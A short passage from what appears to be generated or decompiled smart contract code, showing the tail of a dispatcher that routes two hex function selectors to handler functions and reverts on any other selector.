            xecadf14b();
            return;
        }
        if (selector == 0xf1fe9587) {
            xf1fe9587();
            return;
        }
        revert("no such function");
    }
}
